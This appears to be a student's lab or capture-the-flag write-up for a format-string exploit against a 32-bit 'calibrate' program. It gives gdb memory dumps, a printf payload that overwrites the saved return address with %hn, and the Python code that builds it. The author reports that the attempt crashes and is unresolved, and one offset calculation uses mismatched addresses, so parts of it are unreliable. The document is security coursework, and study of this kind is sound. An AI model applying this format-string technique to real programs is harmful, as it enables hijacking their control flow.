# 01 - Remus Writeup

## Main Idea

The code is vulnerable because of the printf function. We can define arguments to write what we want to memory.
Before that, we need to know the steps of printf. In that schema, arg0 is the address of the printf string. Arg1 and arg2 is the arguments of printf.
We can self-define the arguments that we want. At first, we neet to place the string address above the rip of printf. Then the printf function will use the argument above RIP of printf according to the format of string.

```plaintext
...
[  ][  ][  ][  ] <-- arg2
[  ][  ][  ][  ] <-- arg1
[  ][  ][  ][  ] <-- arg0 (&buf)
[  ][  ][  ][  ] <-- RIP of printf
[  ][  ][  ][  ] <-- SFP of printf
...
```

## Magic Numbers

The address of buffer is `0xffffd5d0`, the RIP is `0xffffd5bc`, so the location of RIP is 20 bytes away from the start of the buffer (0xffffd6ac - 0xffffd698).

``` C++
(gdb) x/16x buf
0xffffd5d0:     0x41414141      0xffffd5bc      0x41414141      0xffffd5be      
0xffffd5e0:     0x63256325      0x63256325      0x63256325      0x63256325      
0xffffd5f0:     0x63256325      0x63256325      0x32353525      0x25753637      
0xffffd600:     0x31256e68      0x33343230      0x6e682575      0x00000a00
(gdb) i f
Stack level 0, frame at 0xffffd5c0:
 eip = 0x8049214 in calibrate (calibrate.c:9); saved eip = 0x804928f
 called by frame at 0xffffd670
 source language c.
 Arglist at 0xffffd5b8, args:
    buf=0xffffd5d0 "AAAA\274\325\377\377AAAA\276\325\377\377%c%c%c%c%c%c%c%c%c%c%c%c%55276u%hn%10243u%hn"
 Locals at 0xffffd5b8, Previous frame's sp is 0xffffd5c0
 Saved registers:
  ebp at 0xffffd5b8, eip at 0xffffd5bc
```

## Exploit Structure

First, we will place the argument we need to buffer, which is significant to what we want to write in memory.
Second, we need printf 12 characters (address of buf - address of argument1) to move the argument to the buffer.
Third, we need to modify the "byte" we have printf to overwrite the address of shellcode into RIP of calibrate by %hn and %u.

## Exploit GDB Output

before attack

```C++
(gdb) x/64x 0xffffd5b0
0xffffd5b0:     0x00000002      0x00000000      0xffffd658      0x0804928f
0xffffd5c0:     0xffffd5d0      0x08048034      0x00000020      0x00000008      
0xffffd5d0:     0x41414141      0xffffd5bc      0x41414141      0xffffd5be      
0xffffd5e0:     0x63256325      0x63256325      0x63256325      0x63256325      
0xffffd5f0:     0x63256325      0x63256325      0x32353525      0x25753637      
0xffffd600:     0x31256e68      0x33343230      0x6e682575      0x0000000a      
0xffffd610:     0x00000000      0x00000001      0x00000000      0xffffd7cb      
0xffffd620:     0x00000002      0x00000000      0x00000000      0x00000000      
0xffffd630:     0x00000000      0xffffdfe0      0xf7ffc540      0xf7ffc000      
0xffffd640:     0x00000000      0x00000000      0x00000000      0x00000000      
0xffffd650:     0x00000000      0xffffd670      0xffffd6f0      0x08049466      
0xffffd660:     0x00000002      0x0804926c      0x0804ffe8      0x08049466      
0xffffd670:     0x00000002      0xffffd6e4      0xffffd6f0      0x0804e04e      
0xffffd680:     0x00000000      0x00000000      0x08049444      0x0804ffe8      
0xffffd690:     0x00000000      0x00000000      0x00000000      0x08049097      
0xffffd6a0:     0x0804926c      0x00000002      0xffffd6e4      0x08049000 
```

after attack

```  C++
Program received signal SIGSEGV, Segmentation fault.
0x0804ad5f in printf_core (f=f@entry=0x80500c0 <__stdout_FILE>, fmt=fmt@entry=0xffffd5d0 "AAAA\274\325\377\377AAAA\276\325\377\377%c%c%c%c%c%c%c%c%c%c%c%c%55276u%hn%10243u%hn\n", ap=ap@entry=0xffffd45c, nl_arg=<optimized out>, nl_type=<optimized out>) at src/stdio/vfprintf.c:548
548     src/stdio/vfprintf.c: No such file or directory.
```

Pathetically, I do not know where the problem is.
Below is my python code.

``` python
payload = ''
payload += "A" * 4   #(consumed by %__u)
payload += '\xbc\xd5\xff\xff'    #  lower half word address of RIP that we want to overwrite
payload += 'A' * 4   #(consumed by %__u)
payload += '\xbe\xd5\xff\xff'    #  higher half word address of RIP that we want to overwrite

payload += "%c" * 12  # move the pointer of printf to buffer

cur =  12 
FIRST_HALF = 65535   # The two most significant bytes of RIP
SECOND_HALF = 55288  # The two least significant bytes of RIP

payload += '%' + str(SECOND_HALF - cur) + 'u'
payload += '%hn'

payload += '%' + str(FIRST_HALF - SECOND_HALF) + 'u'
payload += '%hn'
payload += '\0'
print(payload + '\n')
```
